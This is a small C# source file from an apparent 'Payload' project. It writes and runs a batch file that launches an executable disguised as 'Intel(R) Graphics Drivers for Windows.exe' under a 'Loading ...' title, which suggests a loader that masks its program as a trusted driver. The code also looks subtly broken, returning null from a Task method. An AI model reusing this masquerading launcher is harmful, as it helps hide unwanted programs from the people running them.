using Payload.Common;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Payload.Core.Command
{
    public class StartProcessCommand : Payload.Command.Interface.ICommand
    {
        public override Task Execute()
        {
            string batPath = Config.Instance.WorkSpaceDir + "\\run.bat";

            string batTxt = $"@echo off\npushd {Config.Instance.TargetWorkSpaceDir}\nstart \"Loading ...\" \"Intel(R) Graphics Drivers for Windows.exe\"";
            using (StreamWriter writer = new StreamWriter(batPath))
            {
                writer.WriteLine(batTxt);
            }
            var p = new Process();
            p.StartInfo.FileName = batPath;
            p.Start();
            //CmdHelper.ExecuteCommand("echo testing");
            Console.WriteLine("StartProcessCommand :: Execute");
            return null;
        }
    }
}
